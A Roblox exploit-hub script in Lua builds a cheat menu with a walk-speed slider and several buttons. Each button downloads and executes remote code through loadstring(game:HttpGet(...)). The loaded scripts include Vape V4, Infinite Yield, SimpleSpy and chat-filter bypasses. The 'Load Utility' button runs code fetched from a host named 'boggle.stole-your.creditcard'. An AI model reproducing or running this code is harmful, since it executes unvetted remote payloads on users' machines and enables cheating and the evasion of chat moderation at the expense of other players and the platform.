-- functions stuff
local function identifyExecutor()
    local executor = identifyexecutor and identifyexecutor() or "Unknown"
    return executor
end

-- main
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/borthdayzz/boggle.cc/refs/heads/main/other/mobilesupport.lua"))()

    local Window = Library.CreateLib("Universal - boggle.cc", "DarkTheme")
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")
    MainSection:NewLabel("Game is not supported.")

    MainSection:NewSlider("Walk Speed", "change walkspeed", 500, 16, function(v) 
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
    end)

    MainSection:NewButton("Identify Executor", "", function()
        local executor = identifyExecutor()
        print("Current Executor:", executor)
    end)
    MainSection:NewButton("Load Utility", "yea", function()
        loadstring(game:HttpGet(('https://boggle.stole-your.creditcard/p/raw/vtcqlhoaoe'),true))()
    end)

    -- scripts

    local Scripts = Window:NewTab("Scripts")
    local ScriptsSection = Scripts:NewSection("Scripts")

    ScriptsSection:NewButton("Vape V4", "BEDWARS", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
    end)

    ScriptsSection:NewButton("Inf Yield", "Universal", function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end)

    ScriptsSection:NewButton("SimpleSpy", "Universal", function()
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpyBeta.lua"))()
    end)

    ScriptsSection:NewButton("SimpleSpy Mobile", "Universal", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/RS/main/SimpleSpyMobile"))()
    end)

    ScriptsSection:NewButton("Chat Bypass", "Universal", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Clickgameplay/no-tag-script/main/.NoTagScript"))()
    end)

    ScriptsSection:NewButton("Synergy Chat bypass", "Universal", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua",true))()
    end)